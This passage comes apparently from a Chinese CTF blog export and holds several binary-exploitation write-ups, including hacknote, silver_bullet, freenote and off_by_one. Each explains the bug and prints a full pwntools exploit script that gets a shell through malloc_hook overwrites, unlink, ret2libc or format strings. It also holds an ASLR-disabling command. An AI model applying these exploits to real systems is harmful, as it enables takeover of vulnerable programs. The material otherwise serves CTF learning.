eax,eax后，程序将认为用户输入长度为0，小于三，这个坑就算绕过了.然而程序允许用户输入的长度总共也就8字节，也就是说用户最多一次只能执行8字节的指令.8字节的shellcode我是没有找到,所以这里换一下思路,不直接执行指令,而是通过构造执行buff区的shllcode.接下来我们看到strdup函数,看到这个函数有一个参数保存在rdi中,而这个rdi就是用户输入的内存空间指针.此时我们只要复写strdup为call rdi就能够执行buff区的shllcode了. 脚本写好后发现无法getshell,而本地又开了pie,想调试又比较烦,emmm,有点僵.先放着等以后再填坑.扔个链接：https://ctftime.org/task/6341","link":"/2018/07/31/dead_note_lv1/"},{"title":"dg010赛题复现","text":"dg010赛题复现师傅去打dg010去了，扔给我一道题让我做，无奈当时恰好要去上课，做到一半就扔那儿了，现在有时间了，就做了一下。 首先打开ida看下发现偏移是相对文件的，所以肯定是开启了pie，之后看函数，主要是dele和add里，dele中没有立即对chukList中的ptr清零导致会出现野指针，还有就是add函数中使用的是scanf进行输入，没有对输入长度进行检测，所以存在堆溢出。分析完两个主要的漏洞接下来思考解题策略，开启了pie我们可以通过unsorted bin泄露，得到libc，checksec看了一下发现保护全开，由于保护全开，所以无法进行got覆写之类的，这里考虑mallocHook或者freeHook的覆写，freeHook看了下发现在内存中周边没有合适的size绕过fastbin检查，而mallocHook恰好在ptr-0x13的位置是有合适的size的(低字节0x7f)，如果add的是0x60的fast chunk，那么条件是符合的，所以这里可以用the house of spirit进行mallocHook写oneGadget，就可以利用成功了。这道题的坑点在于开启pie的程序调试的时候不方便，因为代码段是随机化的，break断点不固定，需要手动去断点比较烦。这里要解决这个问题目前我知道的有两种方法，第一种是队友诉我的，通过关闭本地系统的内存地址随机化保护进行调试。echo 0 >/proc/sys/kernel/randomize_va_space 这样的话就能暂时关闭随机化，默认镜像的加载基址是0x555555554000，但是由于ida中显示的指令是相对文件的基址，所以想要下断的话还是需要进行一定的计算，这里队友告诉我可以通过ida中修改segment段的基址，也就是自己制定段加载基址来确定text指令段的内存地址。试了一下还是相当方便的。以后本地调试的时候可以利用这种方法，非常方便。还有一种方法就是通过在脚本中加入一些函数通过查找proc中的相关地址来得到加载地址，也行，不过感觉有一点麻烦，不过调试的时候更加真实吧233333，各有利弊。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *p=process('./clear_note')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')#gdb.attach(p,'''# break *0x0000555555554E9A # continue#''')def add(size,data): p.recvuntil(\"choice>> \") p.sendline('1') p.recvuntil(\"size: \") p.sendline(str(size)) p.recvuntil(\"info: \") p.send(data) p.sendline('\\n')def show(idx): p.recvuntil(\"choice>> \") p.sendline('2') p.recvuntil(\"ndex: \") p.sendline(str(idx)) p.recvuntil('info: ')def dele(idx): p.recvuntil(\"choice>> \") p.sendline('3') p.recvuntil(\"index: \") p.sendline(str(idx))add(0x100,'a')add(0x60,'b')dele(0)show(0)arena=u64(p.recv(6).ljust(8,'\\x00'))libc.address=arena-0x3c4b78log.info('libcBase > '+hex(libc.address))mallocHook=libc.symbols['__malloc_hook']log.info('__malloc_hook > '+hex(mallocHook))#oneGadget=libc.address+0x45216oneGadget=libc.address+0xf1147#oneGadget=libc.address+0x4526a#oneGadget=libc.address+0xf02a4writeAddress=mallocHook-0x13dele(1)dele(0)dele(1)add(0x100,'a'*0x100+p64(0)+p64(0x71)+p64(writeAddress))add(0x60,'b')dele(0)dele(0)dele(1)dele(1)add(0x60,'c'*3+p64(oneGadget))p.recvuntil(\"choice>> \")p.sendline('1')p.recvuntil(\"size: \")p.sendline('10')p.interactive()","link":"/2018/09/09/dg010/"},{"title":"Double Free","text":"#double free 漏洞 介绍 double free漏洞就是明面上的意思，即可以对一个chunk free两次，由于在free的时候，glibc只对main_arena指向的堆块进行检查，即只有当main_arena直接指向的chunk和将要free的hchunk是同一个chunk时程序才会报”double free”错误，也就是说我们只要间隔free就能绕过这个检测。如下： int main(void){ void chunk1,chunk2,*chunk3; chunk1=malloc(0x10); chunk2=malloc(0x10); free(chunk1); free(chunk2); free(chunk1); return 0;}第一次释放free chunk1时，fastbin中链表结构arena->chunk1->NULL第二次释放free chunk2时，fastbin中链表结构arena->chunk2->chunk1->NULL此时若free的是chunk2则glibc就能检测到double free从而报错第三次释放free chunk1时，fastbin中链表结构arena->chunk1->chunk2->chunk1->chunk2 此时若能够在chunk被malloc后修改其fd指向则fastbin中的chunk1也指向修改的地址，如果这个地址时攻击者精心构造过的，那么就能造成一个任意地址写的漏洞。chunk1被malloc后我们再malloc2次指定大小的size后，再下一次就可以在任意地址构造chunk，改写任意地址内容了。 此题就是一个double free的白板题，可以帮助了解double free.exp 如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *r = process('./secretgarden')def raiseflower(length,name,color): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(length)) r.recvuntil(\":\") r.sendline(name) r.recvuntil(\":\") r.sendline(color)def visit(): r.recvuntil(\":\") r.sendline(\"2\")def remove(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx))def clean(): r.recvuntil(\":\") r.sendline(\"4\")magic = 0x400c7bfake_chunk = 0x601ffaraiseflower(0x50,\"da\",\"red\")raiseflower(0x50,\"da\",\"red\")remove(0)remove(1)remove(0)raiseflower(0x50,p64(fake_chunk),\"blue\")raiseflower(0x50,\"da\",\"red\")raiseflower(0x50,\"da\",\"red\")raiseflower(0x50,\"a\"*6 + p64(0) + p64(magic)*2 ,\"red\")r.interactive()","link":"/2018/07/23/double_free/"},{"title":"hacknote","text":"hacknote wp – 白板uaf漏洞利用这道题是pwnable.tw上的一道200分的选单程序，题目给了你程序和libc文件。一般来这种都是根据功能分为好几个函数，我们需要将每一个函数中的逻辑搞清楚，然后在此基础上找到程序的漏洞.当然直接看的话可能会有难度，我们可以通过先随意构造输入使程序崩溃然后再用调试器去分析程序的处理，得到漏洞所在。 打开ida开始分析程序发现逻辑是这样的：首先有一个开始界面显示选项，功能是输出用户选项 123456789puts(\"----------------------\");puts(\" HackNote \");puts(\"----------------------\");puts(\" 1. Add note \");puts(\" 2. Delete note \");puts(\" 3. Print note \");puts(\" 4. Exit \");puts(\"----------------------\");return printf(\"Your choice :\"); 然后输出之后是一个read操作从标准输入获取用户输入,之后就是四个主要函数，我把它们分别定义为add，delete，print以及exit，根据经验，这是道堆题，所以可以把重心放在add和delete函数中，整理一下后发现逻辑是这样的:首先add函数中先malloc一个8个字节的空间，前四个字节用来存储print函数的地址，之后程序会根据用户输入的’note size’给content分配堆空间，然后将分配好的content堆地址存放到最初分配的8个字节的后四个字节，这之后程序获取用户输入的content内容存放到分配的’notesize’大小的堆空间中;delete函数中根据用户输入free掉note结构，但是这里并没有note中的指针设置为null，所以这里可以通过设置迷途指针触发UAF漏洞。具体利用思路如下：首先add两次，notesize只要不设置成8bytes就好，然后分别delete，这样bin中就会多出两个指向8bytes堆空间的指针，这时再add第三个note，并设置内容大小为8bytes，根据fastbin的LIFO的原则,note1的前8个字节存放note2的指针信息，note3的前8个字节存放新的内容， 1(*ptr[v1])(ptr[v1]); 由于print函数中有一个执行note前四个字节指向函数的操作，只要改写了note的前8个字节，就能触发任意地址读和任意命令执行漏洞。需要注意的是这里之前add的两次设置的notesize不能为8bytes，否则的话是无法利用的，因为根据fastbin的LIFO原则，后free掉的空间会先用来存储，而ida中我们可以看到是先free掉存放content的堆空间，然后再free掉note结构的8bytes空间，这样的话之后的add 8bytes就无法改写note结构前8bytes了。这里放上图。既然能任意地址读，那我们可以先泄露libc中system函数的地址,之后再进行一次delete和add执行system指令。还有要注意的就是由于后四个字节不够存放/bin/sh字符串，这里有个操作就是system(‘||sh’)，||sh刚好占用4个字节。嗯呐大体就是这样了,可以说是一个白板的UAF,然而就算是白板我也是看wp才做出来的，呜哇我好菜，快来个dalao拯救我一下~综上，其实uaf漏洞归根结底是linux系统下堆内存管理机制的问题，但是如果代码写得不规范的话还是很容易引起漏洞的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#encoding=utf-8from pwn import *from pwnlib import *exe='./hacknote'#r=process('./hacknote')r=remote('chall.pwnable.tw',10102)#gdb.attach(r,'''b *0x8048a41''')def add(len,content): r.recvuntil('Your choice :') r.sendline('1') r.recvuntil('Note size :') r.sendline(str(len)) r.recvuntil('Content :') r.sendline(content)def delete(index): r.recvuntil('Your choice :') r.sendline('2') r.recvuntil('Index :') r.sendline(str(index))def show(index): r.recvuntil('Your choice :') r.sendline('3') r.recvuntil('Index :') r.sendline(str(index))def leak(): libc=ELF('./libc_32.so.6') libc_read_addr=libc.symbols['free'] libc_system_addr=libc.symbols['system'] add(16,'deadbeef') add(16,'babycafe') delete(0) delete(1) pri_got_addr=0x804862b read_got_addr=0x0804A018 add(8,p32(pri_got_addr)+p32(read_got_addr)) show(0) read_addr=u32(r.recv(4)) system_addr=read_addr-libc_read_addr+libc_system_addr return system_addr leak_system_addr=leak()delete(2)#delete(1)#delete(0) #you have no node in [0], you only have content pointer in 0print hex(leak_system_addr)add(8,p32(leak_system_addr)+'||sh')show(0)r.interactive()","link":"/2018/04/20/hacknote/"},{"title":"Unsorted BIN Attack","text":"Unsorted bin attack白板pwn复现​ 这题可以用unsorted bin attack解决，64位下当>0x80大小的chunk被free时就会被分配到unsorted bin，而此题可以通过edit控制已经free掉的chunk的fd和bk，经过这么多天的刷题对堆题还是可以说是颇有感悟的，一般堆上的漏洞都发生在free后的chunk中，即我们可以通过溢出或其它方法修改已经free掉的chunk的fd、bk、pre_size、size等chunk_header中的元数据，修改指针指向，然后一般就能进行利用了。这题就是这样，edit函数中对用户的输入长度没有做限制，导致攻击者可以通过溢出修改已free的chunk的fd和bk，这里通过修改bk指针使其指向magic-0x10，这样当之前delete后的chunk从unsorted bin中unlink后，magic-0x10的fd就指向了链表头部0x7f1c705ffb78，即magic的值就变为链表头部地址，之后输入choice就可以绕过了。 贴上exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283from pwn import *p=process('./magicheap')magic=0x00000000006020C0gdb.attach(p,''' break *0x0000000000400C8C continue''')def create(size,content): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Size of Heap : ') p.sendline(str(size)) p.recvuntil('Content of heap:') p.sendline(str(content))def edit(index,size,content): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index :') p.sendline(str(index)) p.recvuntil('Size of Heap : ') p.sendline(str(size)) p.recvuntil('Content of heap : ') p.sendline(str(content))def dele(index): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index :') p.sendline(str(index))def exit(): p.recvuntil('Your choice :') p.sendline('4')create(0x80,'0000')create(0x80,'1111')create(0x80,'2222')dele(1)edit(0,0x100,'a'*0x80+p64(0)+p64(0x90)+p64(0)+p64(magic-0x10))create(0x80,'3333') # the chunk1(index 1) unlink (malloc ) from unsorted bin ,and the fake bk point to the main-arena create(0x80,'4444')p.recvuntil('Your choice :')p.sendline('4869')print p.recv(1024)p.interactive()","link":"/2018/07/26/magicheap/"},{"title":"Xman Freenote","text":"xman夏令营 freenote​ 这道题做了一天半，最后终于搞出来了。有很多细节需要注意下。 拿到题目看是freenote肯定就是个堆题，也没看保护直接ida一波走起，大略的看了一下很快发现了漏洞，在delete函数中free掉chunk后没有在chunk list对应的index中置null，导致有个野指针指向了free chunk。 一个野指针能做什么，一开始想的是能否通过double free造一个任意地址写，不过发现这题没有溢出，而且它的new函数中规定你malloc的chunk大小必须为0x80的整数，这样连fastbin都没有了，所以干脆放弃了fastbin attack的思路。接着想0x80的整数倍，那么它free的时候会先放到unsorted bin中，chunk的fd和bk会指向main_arena，此时如果我们再new一个8字节的padding，因为不是0x80的倍数，所以默认分配0x80大小的chunk，覆盖原来free掉的chunk，就可以泄露main_arena的值，也就是原free chunk的bk（其实最后一个字节是固定的，也可以泄露fd）。一旦我们get到unsorted bin的表头地址，因为偏移固定，所以我们可以计算出libc基址，这样的话system和binsh等一些东西的地址就知道了。接下来就是解题的关键所在，知道libc后我们该如何继续去做，看一下edit函数，发现它的逻辑是如果新的输入长度大小原来的输入长度，就会在新的位置realloc一个chunk，如果小于原来的长度才能覆盖原来的chunk。好像也没啥问题，反正就是不能溢出，直接改free chunk的fd和bk不现实，这时候考虑到使用unlink，通过伪造fake chunk来修改chunk list中的值，最后利用edit函数进行修改，很完美，应该就是这种思路。 得知要利用unlink的时候可以想到，首先要知道目标fd和bk的地址，这里由于chunk list是构造在堆上的，所以地址需要泄露，如何泄露，还是unsorted bin，和泄露libc一样的思路，只不过这里需要malloc 4个chunk，delete两个chunk使之有对应的fd和bk，而且delete chunk的顺序需要注意下，防止top chunk从后面进行合并。这样的话我们第一个chunk的指针就能泄露了。由于程序在一开始malloc了一个0x1810大小的chunk，所以偏移可以说是固定的，得到的first allocated chunk的堆地址减去0x1810后得到的就是chunk list ptr的地址了。 最后考虑unlink，需要注意的是之前每次泄露之后都需要清理下chunk，让top进行合并，否则堆结构被破坏会报一些奇怪的错。 unlink这里的操作是先malloc一个大一点的chunk，可以是0x802或0x803，然后在这块大的chunk中构造两个正常的0x80大小的chunk，一个fake chunk，一个正常chunk，这里由于是在一个堆快内，所以元数据可以任意进行构造，构造完成之后delete第二个堆快，因为chunk list中的指针并没有置null，所以这里可以free掉第二个chunk构造unlink。 unlink的时候会有检查，包括size和fd、bk，p->size==(p->nextchunk).prevsize,p==(p->fd)->bk,p==(p->bk)->fd,基本就这样，这个可以根据chunk list的堆结构比划一下，应该不难构造。unlink完成后chunk list就能写了，使用程序自带的edit函数先把free got写入，之后再次edit写system。一开始想的是写atoi，但是atoi在edit中有使用，所以就去写free got了，这里应该也可以one_gadget，待会再试一下。 总的来说这道题还是有点烦的，当然也是我水平不够，没有一眼就看出如何利用，导致审洞+写exp花了很长时间，继续加油吧。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106from pwn import *p=process('./freenote')elf=ELF('./freenote')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')#gdb.attach(p,'''# break *0x00000000004010A8# continue#''')def add(x): p.recvuntil('Your choice: ') p.sendline('2') p.recvuntil('Length of new note: ') p.sendline(str(len(x))) p.recvuntil('Enter your note: ') p.sendline(x)def show(): p.recvuntil('Your choice: ') p.sendline('1')def edit(x,y): p.recvuntil(\"Your choice: \") p.send(\"3\\n\") p.recvuntil(\"Note number: \") p.send(str(x)+\"\\n\") p.recvuntil(\"Length of note: \") p.send(str(len(y))+\"\\n\") p.recvuntil(\"Enter your note: \") p.send(y)def dele(idx): p.recvuntil('Your choice: ') p.sendline('4') p.recvuntil('Note number: ') p.sendline(str(idx))#leak the libcadd('a'*0x80)add('b'*0x80)dele(0)add('\\x78')show()p.recvuntil('0. ')#main_arena=p.recv(6)[::-1]main_arena=u64(p.recv(6).ljust(8,'\\x00'))log.info('main_arena > '+hex(main_arena))libc_base=main_arena-0x3c4b78log.info('libc_base > '+hex(libc_base))system_address=libc_base+libc.symbols['system']binsh_address=libc_base+libc.search('/bin/sh').next()log.info('system_address > '+hex(system_address))log.info('binsh_address > '+hex(binsh_address))dele(1)dele(0) #top chunk merge#leak the chunk list ptradd('a'*0x80) #0add('b'*0x80)add('c'*0x80) #2add('d'*0x80)dele(2)dele(0)add('A'*8)show()p.recvuntil('0. AAAAAAAA')heap_address=(u64(p.recv(4).ljust(8,'\\x00')))heap=heap_address-0x1810#print hex(heap_address)log.info('heap_chunk_ptr > '+hex(heap))dele(3)dele(0)dele(1) #clear the chunk / top chunk merge#unlink#add(0x80*'a')#add(0x80*'b')#add(0x80*'c')#dele(2)#dele(1)#dele(0) #top chunk merge / convert is okpayload=(p64(0)+p64(0x81)+p64(heap+0x8)+p64(heap+0x10)+'0'*0x60+p64(0x80)+p64(0x90)+'1'*0x80)+p64(0)+p64(0x80+0x11)+\"1\"*(0x80-0x20)add(payload)log.info('heap > '+hex(heap))dele(1)atoi_address=elf.got['atoi']log.info('atoi_got > '+hex(atoi_address))#log.info('heap > '+hex(heap))'''#p.sednline(p64(0x0)+p64(1)+p64(0x80)+p64(system_address))payload2=p64(0x80)+p64(1)+p64(0x8)+ p64(atoi_address)+\"A\"*16+p64(binsh_address)payload2+=\"A\"*(0x60*3-len(payload2))edit(0,payload2)edit(0,p64(system_address))p.recvuntil(\"Your choice: \")p.sendline('/bin/sh\\x00') #edit function used atoi so you could not write atoi got'''free_got = 0x602018payload2 = p64(0x80) + p64(1) + p64(0x8) + p64(free_got) + \"A\"*16 + p64(binsh_address)payload2 += \"A\"* (0x80*3-len(payload2))edit(0, payload2)edit(0, p64(system_address))dele(1)p.interactive()","link":"/2018/08/24/xman_freenote/"},{"title":"silver_bullet","text":"silver_bullet – 白板off-by-one漏洞利用​ 这道题也是pwnable.tw上的一道200分的选单程序题，题目很有意思是一个打狼人的游戏，创造一把枪然后根据用户输入的长度给枪充能，然后去打死狼人。//md语文水平太烂了，讲句话都讲不好。选单程序咩，先把逻辑分析清楚，看下各个函数。 123456789101112int menu(){ puts(\"+++++++++++++++++++++++++++\"); puts(\" Silver Bullet \"); puts(\"+++++++++++++++++++++++++++\"); puts(\" 1. Create a Silver Bullet \"); puts(\" 2. Power up Silver Bullet \"); puts(\" 3. Beat the Werewolf \"); puts(\" 4. Return \"); puts(\"+++++++++++++++++++++++++++\"); return printf(\"Your choice :\");} ​ 首先是菜单，显示给用户选项。 然后是creatbullet函数，初始化银枪并充能。 之后是powerup函数，主要功能是通过将新输入的字符串与初始化时的字符串strcat连接起来，并计算新的字符串的长度判断是否超过48，如果超过，就输出无法充能,之后更新银枪能量。最后是beat函数，用银枪去打狼人，如果狼人hp为0就退出main函数。 利用思路： createbullet先输入47个字符进缓冲区,之后进行一次powerup，只输入1个字节，因为输入的是字符串，而且使用的是'strcat'函数,所以输入刚好凑齐48字节，最后的'\\0'会将缓冲区的下一个字节覆盖，通过gdb调试可以发现缓冲区的下面一个字节存放的是字符串长度,\\0刚好可以将len覆盖，这样我们就能通过powerup函数扩充栈然后构造输入溢出(第二次的powerup能输入47个字节，足够将将ebp后四位覆盖了)并将main函数返回地址覆盖,)由于这里没有像hacknote那样的任意命令执行，考虑ret2libc，通过覆盖返回地址构造rop链最后执行system('/bin/sh')来getshell，程序中有printf的plt地址，第一次可以将返回地址构造成printf函数调用的地址，由于这里无法使用栈存放参数，所以利用pop ebx指令将参数放进ebx供printf调用，然后将返回地址设置为main函数起始地址，之后就是再来一次上面的操作，ret2libc执行system调用getshell。 嗯呐就是这样啦，网上看了下教程好像说大多数的off-by-one都是用来扩充栈容量然后给攻击者溢出的，反正这次mark啦。还有就是找rop链，有个工具叫ropgadget，还是很好用的(ROPgadget --binary ./silver_bullet --only 'pop|ret'用来找pop ebx，ret;ROPgadget --binary ./libc_32.so.6 --string '/bin/sh'用来找/bin/sh字符串)。 嗯呐大体就是这样子的。这算是个白板off-by-one了吧。 exp如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#coding=utf8from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal','-x','bash','-c']local = 1if local: #exe = './silver_bullet' #cn = gdb.debug(exe,''' # b *0x08048984 # continue # ''') cn = process('./silver_bullet') bin = ELF('./silver_bullet') libc = ELF('./libc_32.so.6')else: cn = remote('chall.pwnable.tw', 10103) bin = ELF('./silver_bullet') libc = ELF('./libc_32.so.6')def z(a=''): gdb.attach(cn,a) if a == '': raw_input()def create(con): cn.sendline('1') cn.recvuntil('of bullet :') cn.send(con)def powerup(con): cn.sendline('2') cn.recvuntil('of bullet :') cn.send(con)def beat(): cn.sendline('3')p1ret=0x08048475create('a'*(0x30-1))powerup('b')#power 1#z('b*0x080488FB\\nc')pay = '\\xff'*3 + 'bbbb'pay+=p32(bin.plt['puts'])+p32(p1ret)+p32(bin.got['read'])pay+=p32(bin.sym['main'])#print paypowerup(pay)beat()cn.recvuntil('win !!\\n')leak=u32(cn.recv(4))print hex(leak)libc.address = leak-libc.sym['read'] #image base addresssuccess('libc_base: '+hex(libc.address))system = libc.sym['system']binsh = libc.search('/bin/sh\\x00').next()#print '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'#print hex(binsh)#print hex(libc2.search('/bin/sh').next()+libc.address)#print hex(libc2.search('/bin/sh').next())#print hex(libc.address+int(0x1794d1))#print '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'#============one more timecreate('a'*(0x30-1))powerup('b')pay = '\\xff'*3 + 'bbbb'pay+=p32(system)+p32(p1ret)+p32(binsh)powerup(pay)beat()cn.interactive()","link":"/2018/04/20/silver_bullet/"},{"title":"Xman Off_By_One","text":"xman夏令营 off_by_one​ 一道off_by_one的题，做了一天，题目有些地方还是有点骚的，最近感触很深，许多题目你知道漏洞点在哪里，利用手法也清楚，但是写exp的时候会遇到很多奇怪的情况就是达不到你想要的效果或者是不能getshell，由此我觉得一个洞，你知道洞在哪怎么利用，和你真正能写exp弹shell之间差别还是有的，前者考察的你对漏洞和glibc内存管理模式的熟悉，后者可能就需要一些长期以来写exp和调试的经验，emmm，之前一直注重的是审漏洞，现在才发现审到漏洞后写出脚本也很考验能力的。 拿到题目扔ida一看发现居然开了pie，然后看new函数，是个正常的new，用户输入想要malloc的大小，程序进行malloc，接着看delete函数，free掉指针后将chunk list置0，没啥问题，最后看下edit，发现了问题，edit中对chunk进行修改用的是通过strlen当前chunk，得到当前chunk中存储的字符串长度，再进行重新读入相同大小的数据。这里就有问题了，如果strlen的特性是读到null才停，而如果前一个chunk用户数据域全部被使用，则strlen会将下一个chunk的prev_size域也算进去，这样edit时将会多处一个字节的空间给用户输入。 找到漏洞在哪儿后开始结合程序的保护手段进行分析利用方式，首先你需要泄露libc基址，如何泄露，想想刚才找到的洞，发现如果只能对next chunk的prev_size进行一个字节的写入，好像很难进行构造，而如果能利用chunk对齐的特性，使前一个chunk复用后一个chunk的prev_size域，这样的话如果能写入一个字节就能对next chunk的size域进行改写了。改写size域后可以通过伪造chunk和更改其对应的元数据域进行overlap，让前一个chunk包含后一个chunk，如果前一个前一个chunk是再unsorted bin中，那么修改其size域的元数据使其包含后一个chunk，此时再malloc一个和前一个chunk相同大小的chunk，这样glibc的分配器由于在其它bin中找不到恰好合适的chunk会将unsorted bin切一块下来，而剩下的部分继续保存在unsorted bin中，同时在chunk list中，还有一个ptr指向那块被包含的chunk，如果堆快大小是精心构造过的，那么可以让chunk list中的那个之前被包含chunk的ptr指向切剩下来的unsorted bin中的free chunk。 ​ 这样就产生了野指针，而且由于被包含的chunk是unsorted bin中的唯一元素，所以可以顺理成章的泄露main_arena+88的地址，之后就能得到libc基地址和其它一些地址了。那之后该如何去做，现在我们有libc地址，和一个可以进任意改写的free chunk，既然chunk元数据域可以任意写，那能否使用通过伪造chunk进行unlink，显然是比较难的，因为虽然chunk list在bss段，但是代码段的载入基址未知，所以想直接写bss段肯定是非常难的，或者有什么其它骚思路可以写其它区域，可能利用起来也比较麻烦，而且要是知道text段载入基址的话，就能直接构造unlink泄露got表地址，然后写got表了，连main_arena都不用泄露，没开pie的话倒是可以unlink。 可是问题是这道题目是开了pie的，所以unlink没戏。想了一下如果构造的时候被包含的chunk大小属于fastbin，那么进行一次malloc+free后就能得到一个fastbin中的chunk，由于可以任意修改chunk的数据域，那么修改fd为malloc_hook，刚才已经说了因为开启pie所以不好写got。之后house of spirit，写malloc_hook为one_gadget，就能getshell了。另外需要注意的是不能直接写fd为malloc_hook地址，这里会把fd指向的chunk的size域和fastbins中对应bin的大小做对比，同时会把add chunk时输入的大小和fd指向的chunk的size做对比，这里fd如果指向malloc_hook-0x13的话，则size区域最后两个字节为0x7f，这里由于是在fastbin中，大小的话只看前一个字节，后一个字节只看后三位状态位，所以之前构造的被包含的chunk大小一定要是0x70字节大小(allocated chunk状态下)。还有因为这题free hook周边没有满足检查条件的数据(全是null)，所以这里用的是malloc_hook，其实__free_hook也是可以用的。 exp如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *p=process('./offbyone')gdb.attach(p)def add(x): p.recvuntil('>> ') p.sendline('1') p.recvuntil('length: ') p.sendline(str(len(x))) p.recvuntil('your note:\\n') p.sendline(x)def edit(idx,x): p.recvuntil('>> ') p.sendline('2') p.recvuntil('index: ') p.sendline(str(idx)) p.recvuntil('your note:\\n') p.sendline(x)def dele(idx): p.recvuntil('>> ') p.sendline('3') p.recvuntil('index: ') p.sendline(str(idx))def show(idx): p.recvuntil('>> ') p.sendline('4') p.recvuntil('index: ') p.sendline(str(idx)) add(0x28*'a')add(0xf8*'b')add(0x68*'c')add(0x60*'d')dele(1)edit(0,0x28*'a'+'\\x71'+'\\x01')edit(2,0x60*'c'+p64(0x170)+'\\x70')add(0xf8*'0')show(2)main_arena_88=u64(p.recv(6).ljust(8,'\\x00'))log.info('main_arena+88 > '+hex(main_arena_88))libc_base=main_arena_88-0x3c4b78log.info('libc_base > '+hex(libc_base))malloc_hook=libc_base+0x3c4b10log.info('malloc_hook > '+hex(malloc_hook))free_hook=libc_base+0x3c67a8log.info('free_hook > '+hex(free_hook))#edit(2,p64(malloc_hook)+p64(malloc_hook))add(0x68*'a')one_gadget=0x45216+libc_baseone_gadget=0x4526a+libc_baseone_gadget=0xf02a4+libc_base#one_gadget=0xf1147+libc_baselog.info('one_gadget > '+hex(one_gadget))dele(3) dele(2) #chunk[2] move from unsorted bin -> fastbins'''edit(4,p64(free_hook-0x13)[0:6])'''edit(4,p64(malloc_hook-0x13)[0:6])add(0x68*'a')add(3*'0'+p64(one_gadget)+'\\n'*85)dele(3)p.interactive()","link":"/2018/08/25/xman_off_by_one/"},{"title":"XMAN FMT","text":"xman结营赛 fmt​ 一个在xman的朋友扔了个fmt给我，然而我之前没有深入了解过格式化字符串，所以趁这次了解了一下。 大致了解了一下，发现当调用printf等函数的时候，如果没有使用格式化字符串，直接输出字符串变量，正常情况下是可以直接输出的，程序也并没有报错；但是如果这个变量中保存的字符串是用户精心构造的，那就可能造成数据泄露，甚至任意命令执行。 当用户调用printf函数直接输入字符串变量未使用格式化字符串而此变量中保存的字符串又刚好包含格式化字符串，则程序将会把变量中的也就是用户输入的格式化字符串解析为调用函数的格式化字符串，而把栈上的数据当作要操作的内容进行输出，这是32位的情况，如果程序是64位，则会把从rdi开始的寄存器也算进去，优先对寄存器进行输出等操作。常见的构造方式：%c：输出字符，配上%n可用于向指定地址写数据。 %d：输出十进制整数，配上%n可用于向指定地址写数据。 %x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。 %p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。 %s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。 %n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。 %n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。 了解了原理之后再来做题发现就简单了。 这道题的难点在于他没有循环，没有循环就造成一个问题，你最多只能泄露一次或者改写一次数据，而如果只能进行一次操作，那就很难getshell。所以直接一次去改写某个数据很难进行更深的操作，这里必须要有一个循环，聪明的我很快就注意到了（捂脸捂脸），程序开启了canary，而且可以进行溢出，一开始我想的是否能直接leak canary，但是这和之前一样没有循环，然后注意到stack_check_fail函数，想到了可以通过劫持stack_check_fail函数跳到程序开头重新执行，如果每次都进行溢出，那么就能构造一个循环。然后就是leak libc基地址，查找libc库，最后写one_gadget到exit函数。 基本思路确定了，接下来写exp时遇到不少问题，最多的就是输入输出流的接收一直没有搞好，导致输入一直阻塞，但是最终还是把exp写出来了。本地没有成功，但是确定能执行gadget，等以后再填坑吧，基本思路应该是没有错的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116from sys import argvfrom pwn import *context(os=\"linux\", arch=\"amd64\")# context.log_level = \"debug\"# r = process(\"./once_time\", aslr=0)r = remote(argv[1], 20004)e = ELF(\"./once_time\")libc = e.libcdef sl(s): r.sendline(s)def sd(s): r.send(s)def rc(timeout=0): if timeout == 0: return r.recv() else: return r.recv(timeout=timeout)def ru(s, timeout=0): if timeout == 0: return r.recvuntil(s) else: return r.recvuntil(s, timeout=timeout)start = 0x400983rc()sl(p64(e.got[\"__stack_chk_fail\"]))rc()payload = '%'+str(start)+\"d%12$n\"payload = payload.ljust(0x20, \"\\x00\")sd(payload)ru(\"input your name: \")sl(p64(e.got[\"read\"]))ru(\"leave a msg: \")# gdb.attach(r, \"b *0x400968\")# # raw_input()payload = \"%12$s\"payload = payload.ljust(0x20, \"\\x00\")sd(payload)libc.address = int(rc()[:6][::-1].encode(\"hex\"), 16) - libc.symbols[\"read\"]log.info(\"libc > \" + hex(libc.address))# gdb.attach(r, \"b *0x400968\")# # raw_input()one_gadget = 0xf1147 + libc.addresslog.info(\"one_gadget > \" + hex(one_gadget))sl(p64(e.got[\"exit\"]))ru(\"leave 